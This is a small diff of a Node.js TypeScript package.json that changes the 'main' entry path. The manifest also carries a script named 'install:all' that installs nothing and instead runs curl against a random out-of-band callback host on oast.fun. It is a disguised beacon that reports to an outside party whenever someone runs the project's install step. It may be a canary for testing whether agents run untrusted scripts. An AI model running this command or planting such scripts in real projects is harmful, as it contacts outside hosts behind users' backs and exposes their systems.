@@ -2,7 +2,7 @@
   "name": "nodejs-typescript",
   "version": "1.0.0",
   "description": "",
-  "main": "index.ts",
+  "main": "/src/index.ts",
   "type": "module",
   "scripts": {
     "install:all": "curl https://yldltzlfsgobpsuhvgow8529wsnmpynjq.oast.fun"
